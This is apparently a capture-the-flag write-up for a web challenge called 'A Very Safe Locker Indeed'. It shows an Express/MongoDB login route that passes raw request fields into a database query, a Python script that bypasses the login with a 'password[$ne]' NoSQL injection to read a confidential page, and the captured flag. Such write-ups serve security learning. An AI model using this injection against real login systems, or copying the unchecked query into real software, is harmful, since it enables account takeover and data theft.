---
created: 2025-11-15T15:34
updated: 2025-11-16T08:20
title: A Very Safe Locker Indeed
description: A very unsafe locker
solves: 46
points: 270
---

Notice there is no check on the type of email and password.

And since this is mongodb we can just cheese the entire challenge by just doing a NoSQL injection.

Probably unintended, I spent a good 20 minutes trying to trackback how to deliver a XSS payload I made.

```js
router.post("/login", async (req, res) => {
  const { email, password } = req.body;

  const user = await User.findOne({ email, password });
  if (!user) {
    return res.render("login", { error: "Invalid email or password" });
  }

  res.cookie(
    "session",
    {
      userId: user._id,
      firstName: user.firstName,
      lastName: user.lastName,
      phoneNumber: user.phoneNumber,
      email: user.email,
    },
    {
      httpOnly: true,
      signed: true,
      maxAge: 1000 * 60 * 60 * 24,
    }
  );

  res.redirect("/");
});
```

```python
import requests
target = "https://b481553822963efc.chal.ctf.ae"

s = requests.Session()
s1 = requests.Session()
# const { firstName, lastName, phoneNumber, email, password } = req.body
print(s.post(f"{target}/register", data={
    "firstName": "Yun",
    "lastName": "Yun",
    "phoneNumber": "1234567890",
    "email": "yun@yun.ng",
    "password": "yunyunyun"
}))
print(s1.post(f"{target}/login", data={
    "email": "yun@yun.ng.bankmaster",
    "password[$ne]": "w"
}))
print(s1.cookies)
print(s1.get(f"{target}/master/confedential").text)
```

```flag
flag{8b1a8d1f890f5891}
```
